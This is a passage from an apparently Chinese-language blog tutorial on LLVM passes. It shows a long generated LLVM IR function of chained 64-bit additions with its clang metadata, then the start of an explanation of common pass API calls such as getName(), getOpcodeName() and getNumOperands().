class="number">1024</span></span><br><span class="line">  %<span class="number">59</span> = add nsw i64 %<span class="number">58</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">60</span> = add nsw i64 %<span class="number">59</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">61</span> = add nsw i64 %<span class="number">60</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">62</span> = add nsw i64 %<span class="number">61</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">63</span> = add nsw i64 %<span class="number">62</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">64</span> = add nsw i64 %<span class="number">63</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">65</span> = add nsw i64 %<span class="number">64</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">66</span> = add nsw i64 %<span class="number">65</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">67</span> = add nsw i64 %<span class="number">66</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">68</span> = add nsw i64 %<span class="number">67</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">69</span> = add nsw i64 %<span class="number">68</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">70</span> = add nsw i64 %<span class="number">69</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">71</span> = add nsw i64 %<span class="number">70</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">72</span> = add nsw i64 %<span class="number">71</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">73</span> = add nsw i64 %<span class="number">72</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">74</span> = add nsw i64 %<span class="number">73</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">75</span> = add nsw i64 %<span class="number">74</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">76</span> = add nsw i64 %<span class="number">75</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">77</span> = add nsw i64 %<span class="number">76</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">78</span> = add nsw i64 %<span class="number">77</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">79</span> = add nsw i64 %<span class="number">78</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">80</span> = add nsw i64 %<span class="number">79</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">81</span> = add nsw i64 %<span class="number">80</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">82</span> = add nsw i64 %<span class="number">81</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">83</span> = add nsw i64 %<span class="number">82</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">84</span> = add nsw i64 %<span class="number">83</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">85</span> = add nsw i64 %<span class="number">84</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">86</span> = add nsw i64 %<span class="number">85</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">87</span> = add nsw i64 %<span class="number">86</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">88</span> = add nsw i64 %<span class="number">87</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">89</span> = add nsw i64 %<span class="number">88</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">90</span> = add nsw i64 %<span class="number">89</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">91</span> = add nsw i64 %<span class="number">90</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">92</span> = add nsw i64 %<span class="number">91</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">93</span> = add nsw i64 %<span class="number">92</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">94</span> = add nsw i64 %<span class="number">93</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">95</span> = add nsw i64 %<span class="number">94</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">96</span> = add nsw i64 %<span class="number">95</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">97</span> = add nsw i64 %<span class="number">96</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">98</span> = add nsw i64 %<span class="number">97</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">99</span> = add nsw i64 %<span class="number">98</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">100</span> = add nsw i64 %<span class="number">99</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">101</span> = add nsw i64 %<span class="number">100</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">102</span> = add nsw i64 %<span class="number">101</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">103</span> = add nsw i64 %<span class="number">102</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">104</span> = add nsw i64 %<span class="number">103</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">105</span> = add nsw i64 %<span class="number">104</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">106</span> = add nsw i64 %<span class="number">105</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">107</span> = add nsw i64 %<span class="number">106</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">108</span> = add nsw i64 %<span class="number">107</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">109</span> = add nsw i64 %<span class="number">108</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">110</span> = add nsw i64 %<span class="number">109</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">111</span> = add nsw i64 %<span class="number">110</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">112</span> = add nsw i64 %<span class="number">111</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">113</span> = add nsw i64 %<span class="number">112</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">114</span> = add nsw i64 %<span class="number">113</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">115</span> = add nsw i64 %<span class="number">114</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">116</span> = add nsw i64 %<span class="number">115</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">117</span> = add nsw i64 %<span class="number">116</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">118</span> = add nsw i64 %<span class="number">117</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">119</span> = add nsw i64 %<span class="number">118</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">120</span> = add nsw i64 %<span class="number">119</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">121</span> = add nsw i64 %<span class="number">120</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">122</span> = add nsw i64 %<span class="number">121</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">123</span> = add nsw i64 %<span class="number">122</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">124</span> = add nsw i64 %<span class="number">123</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">125</span> = add nsw i64 %<span class="number">124</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">126</span> = add nsw i64 %<span class="number">125</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">127</span> = add nsw i64 %<span class="number">126</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">128</span> = add nsw i64 %<span class="number">127</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">129</span> = add nsw i64 %<span class="number">128</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">130</span> = add nsw i64 %<span class="number">129</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">131</span> = add nsw i64 %<span class="number">130</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">132</span> = add nsw i64 %<span class="number">131</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">133</span> = add nsw i64 %<span class="number">132</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">134</span> = add nsw i64 %<span class="number">133</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">135</span> = add nsw i64 %<span class="number">134</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">136</span> = add nsw i64 %<span class="number">135</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">137</span> = add nsw i64 %<span class="number">136</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">138</span> = add nsw i64 %<span class="number">137</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">139</span> = add nsw i64 %<span class="number">138</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">140</span> = add nsw i64 %<span class="number">139</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">141</span> = add nsw i64 %<span class="number">140</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">142</span> = add nsw i64 %<span class="number">141</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">143</span> = add nsw i64 %<span class="number">142</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">144</span> = add nsw i64 %<span class="number">143</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">145</span> = add nsw i64 %<span class="number">144</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">146</span> = add nsw i64 %<span class="number">145</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">147</span> = add nsw i64 %<span class="number">146</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">148</span> = add nsw i64 %<span class="number">147</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">149</span> = add nsw i64 %<span class="number">148</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">150</span> = add nsw i64 %<span class="number">149</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">151</span> = add nsw i64 %<span class="number">150</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">152</span> = add nsw i64 %<span class="number">151</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">153</span> = add nsw i64 %<span class="number">152</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">154</span> = add nsw i64 %<span class="number">153</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">155</span> = add nsw i64 %<span class="number">154</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">156</span> = add nsw i64 %<span class="number">155</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">157</span> = add nsw i64 %<span class="number">156</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">158</span> = add nsw i64 %<span class="number">157</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">159</span> = add nsw i64 %<span class="number">158</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">160</span> = add nsw i64 %<span class="number">159</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">161</span> = add nsw i64 %<span class="number">160</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">162</span> = add nsw i64 %<span class="number">161</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">163</span> = add nsw i64 %<span class="number">162</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">164</span> = add nsw i64 %<span class="number">163</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">165</span> = add nsw i64 %<span class="number">164</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">166</span> = add nsw i64 %<span class="number">165</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">167</span> = add nsw i64 %<span class="number">166</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">168</span> = add nsw i64 %<span class="number">167</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">169</span> = add nsw i64 %<span class="number">168</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">170</span> = add nsw i64 %<span class="number">169</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">171</span> = add nsw i64 %<span class="number">170</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">172</span> = add nsw i64 %<span class="number">171</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">173</span> = add nsw i64 %<span class="number">172</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">174</span> = add nsw i64 %<span class="number">173</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">175</span> = add nsw i64 %<span class="number">174</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">176</span> = add nsw i64 %<span class="number">175</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">177</span> = add nsw i64 %<span class="number">176</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">178</span> = add nsw i64 %<span class="number">177</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">179</span> = add nsw i64 %<span class="number">178</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">180</span> = add nsw i64 %<span class="number">179</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">181</span> = add nsw i64 %<span class="number">180</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">182</span> = add nsw i64 %<span class="number">181</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">183</span> = add nsw i64 %<span class="number">182</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">184</span> = add nsw i64 %<span class="number">183</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">185</span> = add nsw i64 %<span class="number">184</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">186</span> = add nsw i64 %<span class="number">185</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">187</span> = add nsw i64 %<span class="number">186</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">188</span> = add nsw i64 %<span class="number">187</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">189</span> = add nsw i64 %<span class="number">188</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">190</span> = add nsw i64 %<span class="number">189</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">191</span> = add nsw i64 %<span class="number">190</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">192</span> = add nsw i64 %<span class="number">191</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">193</span> = add nsw i64 %<span class="number">192</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">194</span> = add nsw i64 %<span class="number">193</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">195</span> = add nsw i64 %<span class="number">194</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">196</span> = add nsw i64 %<span class="number">195</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">197</span> = add nsw i64 %<span class="number">196</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">198</span> = add nsw i64 %<span class="number">197</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">199</span> = add nsw i64 %<span class="number">198</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">200</span> = add nsw i64 %<span class="number">199</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">201</span> = add nsw i64 %<span class="number">200</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">202</span> = add nsw i64 %<span class="number">201</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">203</span> = add nsw i64 %<span class="number">202</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">204</span> = add nsw i64 %<span class="number">203</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">205</span> = add nsw i64 %<span class="number">204</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">206</span> = add nsw i64 %<span class="number">205</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">207</span> = add nsw i64 %<span class="number">206</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">208</span> = add nsw i64 %<span class="number">207</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">209</span> = add nsw i64 %<span class="number">208</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">210</span> = add nsw i64 %<span class="number">209</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">211</span> = add nsw i64 %<span class="number">210</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">212</span> = add nsw i64 %<span class="number">211</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">213</span> = add nsw i64 %<span class="number">212</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">214</span> = add nsw i64 %<span class="number">213</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">215</span> = add nsw i64 %<span class="number">214</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">216</span> = add nsw i64 %<span class="number">215</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">217</span> = add nsw i64 %<span class="number">216</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">218</span> = add nsw i64 %<span class="number">217</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">219</span> = add nsw i64 %<span class="number">218</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">220</span> = add nsw i64 %<span class="number">219</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">221</span> = add nsw i64 %<span class="number">220</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">222</span> = add nsw i64 %<span class="number">221</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">223</span> = add nsw i64 %<span class="number">222</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">224</span> = add nsw i64 %<span class="number">223</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">225</span> = add nsw i64 %<span class="number">224</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">226</span> = add nsw i64 %<span class="number">225</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">227</span> = add nsw i64 %<span class="number">226</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">228</span> = add nsw i64 %<span class="number">227</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">229</span> = add nsw i64 %<span class="number">228</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">230</span> = add nsw i64 %<span class="number">229</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">231</span> = add nsw i64 %<span class="number">230</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">232</span> = add nsw i64 %<span class="number">231</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">233</span> = add nsw i64 %<span class="number">232</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">234</span> = add nsw i64 %<span class="number">233</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">235</span> = add nsw i64 %<span class="number">234</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">236</span> = add nsw i64 %<span class="number">235</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">237</span> = add nsw i64 %<span class="number">236</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">238</span> = add nsw i64 %<span class="number">237</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">239</span> = add nsw i64 %<span class="number">238</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">240</span> = add nsw i64 %<span class="number">239</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">241</span> = add nsw i64 %<span class="number">240</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">242</span> = add nsw i64 %<span class="number">241</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">243</span> = add nsw i64 %<span class="number">242</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">244</span> = add nsw i64 %<span class="number">243</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">245</span> = add nsw i64 %<span class="number">244</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">246</span> = add nsw i64 %<span class="number">245</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">247</span> = add nsw i64 %<span class="number">246</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">248</span> = add nsw i64 %<span class="number">247</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">249</span> = add nsw i64 %<span class="number">248</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">250</span> = add nsw i64 %<span class="number">249</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">251</span> = add nsw i64 %<span class="number">250</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">252</span> = add nsw i64 %<span class="number">251</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">253</span> = add nsw i64 %<span class="number">252</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">254</span> = add nsw i64 %<span class="number">253</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">255</span> = add nsw i64 %<span class="number">254</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">256</span> = add nsw i64 %<span class="number">255</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">257</span> = add nsw i64 %<span class="number">256</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">258</span> = add nsw i64 %<span class="number">257</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">259</span> = add nsw i64 %<span class="number">258</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">260</span> = add nsw i64 %<span class="number">259</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">261</span> = add nsw i64 %<span class="number">260</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">262</span> = add nsw i64 %<span class="number">261</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">263</span> = add nsw i64 %<span class="number">262</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">264</span> = add nsw i64 %<span class="number">263</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">265</span> = add nsw i64 %<span class="number">264</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">266</span> = add nsw i64 %<span class="number">265</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">267</span> = add nsw i64 %<span class="number">266</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">268</span> = add nsw i64 %<span class="number">267</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">269</span> = add nsw i64 %<span class="number">268</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">270</span> = add nsw i64 %<span class="number">269</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">271</span> = add nsw i64 %<span class="number">270</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">272</span> = add nsw i64 %<span class="number">271</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">273</span> = add nsw i64 %<span class="number">272</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">274</span> = add nsw i64 %<span class="number">273</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">275</span> = add nsw i64 %<span class="number">274</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">276</span> = add nsw i64 %<span class="number">275</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">277</span> = add nsw i64 %<span class="number">276</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">278</span> = add nsw i64 %<span class="number">277</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">279</span> = add nsw i64 %<span class="number">278</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">280</span> = add nsw i64 %<span class="number">279</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">281</span> = add nsw i64 %<span class="number">280</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">282</span> = add nsw i64 %<span class="number">281</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">283</span> = add nsw i64 %<span class="number">282</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">284</span> = add nsw i64 %<span class="number">283</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">285</span> = add nsw i64 %<span class="number">284</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">286</span> = add nsw i64 %<span class="number">285</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">287</span> = add nsw i64 %<span class="number">286</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">288</span> = add nsw i64 %<span class="number">287</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">289</span> = add nsw i64 %<span class="number">288</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">290</span> = add nsw i64 %<span class="number">289</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">291</span> = add nsw i64 %<span class="number">290</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">292</span> = add nsw i64 %<span class="number">291</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">293</span> = add nsw i64 %<span class="number">292</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">294</span> = add nsw i64 %<span class="number">293</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">295</span> = add nsw i64 %<span class="number">294</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">296</span> = add nsw i64 %<span class="number">295</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">297</span> = add nsw i64 %<span class="number">296</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">298</span> = add nsw i64 %<span class="number">297</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">299</span> = add nsw i64 %<span class="number">298</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">300</span> = add nsw i64 %<span class="number">299</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">301</span> = add nsw i64 %<span class="number">300</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">302</span> = add nsw i64 %<span class="number">301</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">303</span> = add nsw i64 %<span class="number">302</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">304</span> = add nsw i64 %<span class="number">303</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">305</span> = add nsw i64 %<span class="number">304</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">306</span> = add nsw i64 %<span class="number">305</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">307</span> = add nsw i64 %<span class="number">306</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">308</span> = add nsw i64 %<span class="number">307</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">309</span> = add nsw i64 %<span class="number">308</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">310</span> = add nsw i64 %<span class="number">309</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">311</span> = add nsw i64 %<span class="number">310</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">312</span> = add nsw i64 %<span class="number">311</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">313</span> = add nsw i64 %<span class="number">312</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">314</span> = add nsw i64 %<span class="number">313</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">315</span> = add nsw i64 %<span class="number">314</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">316</span> = add nsw i64 %<span class="number">315</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">317</span> = add nsw i64 %<span class="number">316</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">318</span> = add nsw i64 %<span class="number">317</span>, <span class="number">1024</span></span><br><span class="line">  ret i64 %<span class="number">318</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;tune-cpu&quot;</span>=<span class="string">&quot;generic&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"> </span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"> </span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;</span>&#125;</span><br></pre></td></tr></table></div></figure>






        <h1 id="常见用法"   >
          <a href="#常见用法" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h1>
      <ol>
<li><p><code>getName()</code>函数用于获取当前<code>runOnFunction</code>正处理的函数名</p>
</li>
<li><p>第一个<code>for</code>循环是对当前处理的函数中的基本块（比如一些条件分支语句就会产生多个基本块，在生成的<code>ll</code>文件中，不同基本块之间会有换行）遍历，第二个<code>for</code>循环是对每个基本块中的指令遍历</p>
</li>
<li><p><code>getOpcodeName()</code>函数用于获取指令的操作符的名称，</p>
</li>
<li><p><code>getNumOperands()</code>用于获取指令的操作数的个数，</p>
</li>
